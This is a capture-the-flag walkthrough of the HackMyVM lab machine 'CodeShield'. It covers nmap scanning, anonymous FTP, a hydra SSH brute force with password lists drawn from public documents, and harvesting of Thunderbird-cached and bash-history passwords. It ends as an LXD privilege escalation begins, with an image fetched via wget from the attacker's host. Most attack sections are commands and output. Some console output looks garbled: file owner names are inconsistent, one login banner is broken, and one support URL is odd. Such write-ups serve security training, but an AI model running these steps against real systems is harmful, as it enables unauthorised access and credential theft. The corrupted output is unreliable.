# CodeShield

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| CodeShield | eMVee | Beginner | HackMyVM |

**Summary:** CodeShield demonstrates a multi-layered attack chain exploiting weak security practices and poor credential management. The engagement begins with anonymous FTP access to company documents, from which weak password lists are extracted and cross-referenced with employee names harvested from the corporate website. Initial SSH access is gained against port 22222 using brute-force attacks with these discovered credentials. Once authenticated as valdezk, local reconnaissance reveals cached mail credentials stored in Mozilla Thunderbird configuration files. These credentials facilitate lateral movement to the mitchellt account, whose bash history inadvertently leaks password information for another user. The subsequent pivot to the earlyp user account, who is a member of the lxd group, enables a containerization-based privilege escalation technique. By creating a privileged LXD container with direct filesystem access, the attacker mounts the host root filesystem and gains unrestricted access to the system as root. This scenario exemplifies how organizational information exposure, weak password policies, credential caching, insufficient access controls, and dangerous group memberships combine to enable complete system compromise.

---

## Reconnaissance

### Network Enumeration

The engagement begins with network discovery to identify the target machine within the 192.168.100.0/24 subnet. Using a PowerShell scanning script, the CodeShield instance is located at 192.168.100.166.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.166 08:00:27:61:49:1F VirtualBox
```

The target is added to the local hosts file for DNS resolution:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ echo "192.168.100.166 mail.codeshield.hmv codeshield.hmv" | sudo tee -a /etc/hosts
[sudo] password for ouba:
192.168.100.166 mail.codeshield.hmv codeshield.hmv
```

### Port and Service Scanning

A comprehensive port scan using Nmap reveals a substantial attack surface with multiple services running across the system:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ ip=192.168.100.166 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-10 22:16 WIB
Nmap scan report for 192.168.100.166
Host is up (0.0036s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 1002     1002      2349914 Aug 30  2023 CodeShield_pitch_deck.pdf
| -rw-rw-r--    1 1003     1003        67520 Aug 28  2023 Information_Security_Policy.pdf
|_-rw-rw-r--    1 1004     1004       226435 Aug 28  2023 The_2023_weak_password_report.pdf
22/tcp    open  ssh           OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey:
|   2048 32:14:67:32:02:7a:b6:e4:7f:a7:22:0b:02:fd:ee:07 (RSA)
|   256 34:e4:d0:5d:bd:bc:9e:3f:4c:f9:1e:7d:3c:60:ce:6e (ECDSA)
|_  256 ef:3c:ff:f9:9a:a3:aa:7d:5a:82:73:b9:8c:b8:97:04 (ED25519)
25/tcp    open  smtp          Postfix smtpd
|_smtp-commands: SMTP: EHLO 521 5.5.1 Protocol error\x0D
80/tcp    open  http          nginx
|_http-title: Did not follow redirect to https://192.168.100.166/
110/tcp   open  pop3          Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
|_pop3-capabilities: CAPA RESP-CODES STLS SASL TOP UIDL AUTH-RESP-CODE PIPELINING
143/tcp   open  imap          Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IMAP4rev1 LITERAL+ capabilities LOGINDISABLEDA0001 OK ID listed more have Pre-login post-login SASL-IR STARTTLS ENABLE LOGIN-REFERRALS IDLE
443/tcp   open  ssl/http      nginx
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: CodeShield - Home
465/tcp   open  ssl/smtp      Postfix smtpd
|_smtp-commands: mail.codeshield.hmv, PIPELINING, SIZE 15728640, ETRN, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
|_ssl-date: TLS randomness does not represent time
587/tcp   open  smtp          Postfix smtpd
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2023-08-23T09:34:43
|_smtp-commands: mail.codeshield.hmv, PIPELINING, SIZE 15728640, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
|_ssl-date: TLS randomness does not represent time
993/tcp   open  imaps?
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
|_imap-capabilities: IMAP4rev1 LITERAL+ capabilities more OK ID listed have LOGIN-REFERRALS Pre-login post-login SASL-IR AUTH=PLAIN ENABLE AUTH=LOGINA0001 IDLE
|_ssl-date: TLS randomness does not represent time
995/tcp   open  pop3s?
|_pop3-capabilities: CAPA RESP-CODES USER SASL(PLAIN LOGIN) TOP UIDL AUTH-RESP-CODE PIPELINING
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
2222/tcp  open  ssh           OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey:
|   2048 32:14:67:32:02:7a:b6:e4:7f:a7:22:0b:02:fd:ee:07 (RSA)
|   256 34:e4:d0:5d:bd:bc:9e:3f:4c:f9:1e:7d:3c:60:ce:6e (ECDSA)
|_  256 ef:3c:ff:f9:9a:a3:aa:7d:5a:82:73:b9:8c:b8:97:04 (ED25519)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
22222/tcp open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 2a:49:28:84:25:99:62:e8:29:68:88:d6:36:be:8e:d6 (ECDSA)
|_  256 20:9f:5b:3f:52:eb:a9:60:27:39:3b:e7:d8:17:8d:70 (ED25519)
Service Info: Hosts: -mail.codeshield.hmv,  mail.codeshield.hmv; OSs: Unix, Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.57 seconds
```

The scan reveals a complex infrastructure including an anonymous FTP server, multiple mail services (SMTP, POP3, IMAP), a web server redirecting to HTTPS, and SSH instances on both standard port 22 and alternate port 22222.

---

## Initial Access

### Anonymous FTP Access

The Nmap scan immediately reveals that anonymous FTP access is enabled on port 21. Three PDF documents are publicly accessible, representing a significant information disclosure vulnerability. These files are downloaded for further analysis:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ ftp $ip
Connected to 192.168.100.166.
220 (vsFTPd 3.0.5)
Name (192.168.100.166:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||42105|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        137          4096 Aug 30  2023 .
drwxr-xr-x    2 0        137          4096 Aug 30  2023 ..
-rw-rw-r--    1 1002     1002      2349914 Aug 30  2023 CodeShield_pitch_deck.pdf
-rw-rw-r--    1 1003     1003        67520 Aug 28  2023 Information_Security_Policy.pdf
-rw-rw-r--    1 1004     1004       226435 Aug 28  2023 The_2023_weak_password_report.pdf
226 Directory send OK.
ftp> mget *
mget CodeShield_pitch_deck.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||13123|)
150 Opening BINARY mode data connection for CodeShield_pitch_deck.pdf (2349914 bytes).
100% |*******************|  2294 KiB   14.54 MiB/s    00:00 ETA
226 Transfer complete.
2349914 bytes received in 00:00 (14.25 MiB/s)
mget Information_Security_Policy.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||31340|)
150 Opening BINARY mode data connection for Information_Security_Policy.pdf (67520 bytes).
100% |*******************| 67520        3.70 MiB/s    00:00 ETA
226 Transfer complete.
67520 bytes received in 00:00 (3.30 MiB/s)
mget The_2023_weak_password_report.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||62941|)
150 Opening BINARY mode data connection for The_2023_weak_password_report.pdf (226435 bytes).
100% |*******************|   221 KiB    9.56 MiB/s    00:00 ETA
226 Transfer complete.
226435 bytes received in 00:00 (8.58 MiB/s)
ftp> exit
221 Goodbye.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ ls -la
total 2628
drwxr-xr-x   2 ouba ouba    4096 Apr 10 22:21 .
drwxrwxrwt 146 root root   36864 Apr 10 22:21 ..
-rw-r--r--   1 ouba ouba 2349914 Aug 30  2023 CodeShield_pitch_deck.pdf
-rw-r--r--   1 ouba ouba   67520 Aug 29  2023 Information_Security_Policy.pdf
-rw-r--r--   1 ouba ouba  226435 Aug 29  2023 The_2023_weak_password_report.pdf

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ file ./*
./CodeShield_pitch_deck.pdf:         PDF document, version 1.6, 17 page(s)
./Information_Security_Policy.pdf:   PDF document, version 1.6, 15 page(s) (zip deflate encoded)
./The_2023_weak_password_report.pdf: PDF document, version 1.6, 16 page(s) (zip deflate encoded)
```

### Password Intelligence from Public Documents

The "2023 Weak Passwords Report" document is particularly valuable, as it contains a list of the most common weak passwords used throughout 2023. Extraction from this document yields the following candidates:

![](image-2.png)

A password file is created from the weak passwords identified in the document:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ cat passwords.txt
Xxxxxxxxx001
Password123!
Greatplace2work!
Diciembre@2017
Hairdresser1!
1qa2ws3ed4rf
XXXX12345678
Hairdresser1
Xxxxxxxxx002
Xxxxxxxxxx01
```

### Website Enumeration and Employee Identification

The corporate website hosts an "About Us" section displaying company leadership with full names. Multiple team members are identified through both the about page and testimonials:

![](image.png)

![](image-1.png)

The website explicitly references Kevin Valdez as an intern who assisted with website development, providing an additional user account lead. A comprehensive username list is compiled from all identified personnel:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ vim users.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ cat users.txt
jessica carlson
mohammed mansour
xian tan
annabella cocci
thomas mitchell
patrick early
kevin valdez

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ username-anarchy --input-file ./users.txt > anarchy_users.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ tail -n 5 anarchy_users.txt
valdezk
valdez
valdez.k
valdez.kevin
kv
```

The username-anarchy tool generates permutations of potential usernames based on the names gathered from the website. This dramatically expands the attack surface for credential brute-forcing.

### SSH Brute Force

With a substantial list of potential usernames and weak passwords derived from public sources, an SSH brute-force attack is launched against port 22222, which hosts a newer version of OpenSSH (8.9p1):

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ hydra -L anarchy_users.txt -P passwords.txt ssh://$ip -t 8 -s 22222
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-10 23:39:57
[DATA] max 8 tasks per 1 server, overall 8 tasks, 1000 login tries (l:100/p:10), ~125 tries per task
[DATA] attacking ssh://192.168.100.166:22222/
[STATUS] 160.00 tries/min, 160 tries in 00:01h, 840 to do in 00:06h, 8 active
[STATUS] 157.67 tries/min, 473 tries in 00:03h, 527 to do in 00:04h, 8 active
[22222][ssh] host: 192.168.100.166   login: valdezk   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-11 00:02:45
```

Successful authentication is achieved using the credentials `valdezk` with a password extracted from the weak password report. SSH access is established:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ ssh valdezk@$ip -p 22222
The authenticity of host '[192.168.100.166]:22222 ([192.168.100.166]:22222)' can't be established.
ED25519 key fingerprint is: SHA256:Y+iV2eHvzSBp6ZbF+2VqTJdZ5+XyH5tVaxNCzS7tp3I
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.100.166]:22222' (ED25519) to the list of known hosts.
             @@@
      @@@@@@@@@  @@@@@@
 @@@@@@@@@@@@@@          (@@
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗     ██████╗
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝
        @@@@@@@   @@@
           @@@@@@@

  _______________________________________________________________________________________________________
 |  _WARNING: This system is restricted to authorized users!___________________________________________  |
 | |                                                                                                   | |
 | | IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        | |
 | |                                                                                                   | |
 | | This system is restricted to authorized users.                                                    | |
 | | Individuals who attempt unauthorized access will be prosecuted.                                   | |
 | | If you're unauthorized, terminate access now!                                                     | |
 | |                                                                                                   | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________|
valdezk@192.168.100.166's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-79-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Apr 10 04:57:55 PM UTC 2026

  System load:  0.03515625         Processes:               242
  Usage of /:   28.2% of 47.93GB   Users logged in:         0
  Memory usage: 63%                IPv4 address for enp0s3: 192.168.100.166
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or use: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


valdezk@codeshield:~$ ls -la
total 172
drwxr-x--- 18 valdezk valdezk  4096 Aug 29  2023 .
drwxr-xr-x 14 root    root     4096 Aug 26  2023 ..
-rw-rw-r--  1 valdezk valdezk     0 Aug 28  2023 .bash_history
-rw-r--r--  1 valdezk valdezk   220 Aug 26  2023 .bash_logout
-rw-r--r--  1 valdezk valdezk  3771 Aug 26  2023 .bashrc
drwx------ 12 valdezk valdezk  4096 Apr 10 16:46 .cache
drwx------ 11 valdezk valdezk  4096 Aug 28  2023 .config
drwxr-xr-x  2 valdezk valdezk  4096 Aug 28  2023 Desktop
drwxr-xr-x  2 valdezk valdezk  4096 Aug 28  2023 Downloads
drwx------  3 valdezk valdezk  4096 Aug 28  2023 .local
drwx------  3 valdezk valdezk  4096 Aug 28  2023 .mozilla
drwxr-xr-x  2 valdezk valdezk  4096 Aug 28  2023 Music
drwxrwxrwt  2 valdezk valdezk  4096 Aug 29  2023 .pcsc10
drwxr-xr-x  2 valdezk valdezk  4096 Aug 28  2023 Pictures
-rw-r--r--  1 valdezk valdezk   807 Aug 26  2023 .profile
drwxr-xr-x  2 valdezk valdezk  4096 Aug 28  2023 Public
drwx------  3 valdezk valdezk  4096 Aug 28  2023 snap
drwxr-xr-x  2 valdezk valdezk  4096 Aug 28  2023 Templates
drwxrwxr-t  2 valdezk valdezk  4096 Aug 29  2023 thinclient_drives
drwx------  6 valdezk valdezk  4096 Aug 28  2023 .thunderbird
-rw-r-----  1 valdezk valdezk     5 Aug 29  2023 .vboxclient-clipboard-tty1-control.pid
```

---

## Lateral Movement

### Credential Discovery in Email Client Configuration

Once connected to the system as valdezk, local reconnaissance begins to identify paths for privilege escalation and lateral movement. A recursive grep search for the string "password" throughout the home directory reveals stored credentials in Mozilla Thunderbird email client configuration files:

```bash
valdezk@codeshield:~$ grep -ri "password"
...
.thunderbird/fx2h7mhy.default-release/ImapMail/mail.codeshield.hmv/Trash: Password: D@t[REDACTED]
.thunderbird/fx2h7mhy.default-release/ImapMail/mail.codeshield.hmv/INBOX: Password: D@t[REDACTED]
...
```

Mozilla Thunderbird caches email credentials locally in configuration files, allowing attackers who achieve local file access to recover authentication material. These cached credentials belong to another user account. A new SSH login is immediately attempted using these discovered credentials:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ vim users2.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ hydra -L users2.txt -p D@t[REDACTED] ssh://$ip -t 8 -s 22222
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-11 00:02:45
[DATA] max 8 tasks per 1 server, overall 8 tasks, 75 login tries (l:75/p:1), ~10 tries per task
[DATA] attacking ssh://192.168.100.166:22222/
[22222][ssh] host: 192.168.100.166   login: mitchellt   password: D@t[REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-11 00:03:23
```

Successful lateral movement is achieved by authenticating as mitchellt:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ ssh mitchellt@$ip -p 22222
             @@@
      @@@@@@@@@  @@@@@@
 @@@@@@@@@@@@@@          (@@
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗     ██████╗
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║
  @@@████████  @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝
        @@@@@@@   @@@
           @@@@@@@

  _______________________________________________________________________________________________________
 |  _WARNING: This system is restricted to authorized users!___________________________________________  |
 | |                                                                                                   | |
 | | IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        | |
 | |                                                                                                   | |
 | | This system is restricted to authorized users.                                                    | |
 | | Individuals who attempt unauthorized access will be prosecuted.                                    | |
 | | If you're unauthorized, terminate access now!                                                     | |
 | |                                                                                                   | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________|
mitchellt@192.168.100.166's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-79-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/surprise

  System information as of Fri Apr 10 05:03:12 PM UTC 2026

  System load:  0.28564453125      Processes:               257
  Usage of /:   28.2% of 47.93GB   Users logged in:         0
  Memory usage: 64%                IPv4 address for enp0s3: 192.168.100.166
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


mitchellt@codeshield:~$ id
uid=1006(mitchellt) gid=1006(mitchellt) groups=1006(mitchellt)
mitchellt@codeshield:~$ ls -la
total 112
drwxr-x--- 17 mitchellt mitchellt 4096 Aug 30  2023 .
drwxr-xr-x 14 root      root      4096 Aug 26  2023 ..
-rw-------  1 mitchellt mitchlett  209 Aug 30  2023 .bash_history
-rw-r--r--  1 mitchlett mitchelt   220 Aug 26  2023 .bash_logout
-rw-r--r--  1 mitchelt mitchell  3771 Aug 26  2023 .bashrc
drwx------ 11 mitchelt mitche    4096 Apr 10 17:03 .cache
drwx------ 12 mitchelt mitchell  4096 Aug 29  2023 .config
drwxr-xr-x  2 mitchell mitchell   4096 Aug 28  2023 Desktop
drwxr-xr-x  2 mitchell mitchell   4096 Aug 28  2023 Documents
drwxr-xr-x  2 mitchell mitchell   4096 Aug 28  2023 Downloads
-rw-------  1 mitchell mitchell    20 Aug 29  2023 .lesshst
drwx------  3 mitchell mitchell   4096 Aug 28  2023 .local
drwxrwxr-x  6 mitchell mitchell   4096 Aug 30  2023 mining
drwx------  3 mitchell mitchell   4096 Aug 28  2023 .mozilla
drwxr-xr-x  2 mitchell mitchell   4096 Aug 28  2023 Music
drwxr-xr-x  2 mitchell mitchell   4096 Aug 28  2023 Pictures
-rw-r--r--  1 mitchell mitchell   807 Aug 26  2023 .profile
drwxr-xr-x  2 mitchell mitchell   4096 Aug 28  2023 Public
drwx------  3 mitchell mitchell   4096 Aug 28  2023 snap
drwxr-xr-x  2 mitchell mitchell   4096 Aug 28  2023 Templates
drwx------  6 mitchell mitchell   4096 Aug 28  2023 .thunderbird
-rwxrwx---  1 mitchell mitchell   2401 Aug 28  2023 user.txt
-rw-r-----  1 mitchell mitchell      6 Aug 30  2023 .vboxclient-clipboard-tty2-control.pid
-rw-r-----  1 mitchell mitchell      6 Aug 30  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 mitchell mitchell      6 Aug 30  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 mitchell mitchell      6 Aug 30  2023 .vboxclient-seamless-tty2-control.pid
-rw-r-----  1 mitchell mitchell      6 Aug 30  2023 .vboxclient-seamless-tty2-control.pid
drwxr-xr-x  2 mitchell mitchell   4096 Aug 28  2023 Videos
mitchellt@codeshield:~$ cat .bash_history
echo 'EAR[REDACTED]'| su - earlyp -c "cp -r /home/earlyp/Development/mining ."
echo 'EAR[REDACTED]'| su - earlyp -c "cp -r /home/earlyp/Development/mining /tmp"
cp -r /tmp/mining .
ls
cd mining/
ls
exit
```

The bash history file reveals that the mitchlett user previously executed commands as the earlyp user, passing a password via echo piping to su. This leaked password becomes the next compromise vector.

### Further Lateral Movement to earlyp

The password discovered in bash history allows authentication as the earlyp user:

```bash
mitchellt@codeshield:~$ su - earlyp
Password:
earlyp@codeshield:~$ id
uid=1000(earlyp) gid=1000(earlyp) groups=1000(earlyp),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
earlyp@codeshield:~$ ls -la
total 116
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 .
drwxr-xr-x 14 root   root   4096 Aug 26  2023 ..
-rw-------  1 earlyp earlyp   36 Aug 29  2023 .bash_history
-rw-r--r--  1 earlyp earlyp  220 Jan  6  2022 .bash_logout
-rw-r--r--  1 earlyp earlyp 3771 Jan  6  2022 .bashrc
drwx------ 12 earlyp earlyp 4096 Aug 23  2023 .cache
drwx------ 16 earlyp earlyp 4096 Aug 28  2023 .config
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Desktop
drwxrwxr-x  3 earlyp earlyp 4096 Aug 28  2023 Development
drwxr-xr-x  2 earlyp earlyp 4096 Aug 28  2023 Documents
drwxr-xr-x  5 earlyp earlyp 4096 Aug 23  2023 Downloads
drwx------  2 earlyp earlyp 4096 Aug 28  2023 .gnupg
drwx------  3 earlyp earlyp 4096 Aug 22  2023 .local
drwxrwxr-x  6 earlyp earlyp 4096 Aug 29  2023 mining
drwxrwxr-x  2 earlyp earlyp 4096 Aug 23  2023 .mono
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Music
drwxr-xr-x  3 earlyp earlyp 4096 Aug 23  2023 Pictures
-rw-r--r--  1 earlyp earlyp   807 Jan  6  2022 .profile
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Public
-rw-rw-r--  1 earlyp earlyp   233 Aug 23  2023 .recently-used
drwx------  3 earlyp earlyp 4096 Aug 22  2023 snap
drwx------  2 earlyp earlyp 4096 Aug 22  2023 .ssh
-rw-r--r--  1 earlyp earlyp    0 Aug 22  2023 .sudo_as_admin_successful
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Templates
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-clipboard-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-seamless-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-draganddrop-tty2-control.pid
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Videos
```

Critically, the earlyp user is a member of the lxd group, which provides capabilities to manage Linux containers. This group membership becomes the avenue for privilege escalation to root.

---

## Privilege Escalation

### LXD Container Privilege Escalation

The lxd group membership allows earlyp to create and manipulate LXD containers with unrestricted access to the host filesystem. This technique exploits the fact that container creation with filesystem mounts can circumvent normal Linux access controls. The attack proceeds by building a malicious Alpine Linux container image that mounts the host root filesystem at a path accessible from within the container.

First, an Alpine Linux builder is cloned and used to generate a minimal Alpine container image:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ git clone https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 57, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 57 (delta 6), reused 8 (delta 4), pack-reused 42 (from 1)
Receiving objects: 100% (57/57), 3.12 MiB | 1.24 MiB/s, done.
Resolving deltas: 100% (19/19), done.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield]
└─$ cd lxd-alpine-builder

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield/lxd-alpine-builder]
└─$ sudo ./build-alpine
[sudo] password for ouba:
Determining the latest release... v3.23
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.23/main/x86_64
Downloading alpine-keys-2.6-r0.apk
...
OK: 9908 KiB in 27 packages

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield/lxd-alpine-builder]
└─$ ls
alpine-v3.23-x86_64-20260411_0018.tar.gz  build-alpine  LICENSE  README.md

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/codeshield/lxd-alpine-builder]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

The generated Alpine container image is now served via HTTP and transferred to the target system:

```bash
earlyp@codeshield:~$ cd /tmp
earlyp@codeshield:/tmp$ wget http://192.168.100.1:8080/alpine-v3.23-x86_64-20260411_0018.tar.gz
--2026-04-10 17:22:02--  http://192.168.100.1:8080/alpine-v3.23-x86_64-20260411_0018.tar.gz
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4112766 (3.9M) [application/gzip]
Saving to: 'alpine-v3.23-x86_64-20260411_0018.tar.gz'

alpine-v3.23-x86_64-20260411_001 100%[=======================================================>]   3.92M  17.1MB/s    in 0.2s

2026-04-10 17:22:02 (17.1 MB/s) - 'alpine-v3.23-x86_64-20260411_0018.tar.gz' saved [4112766 bytes]

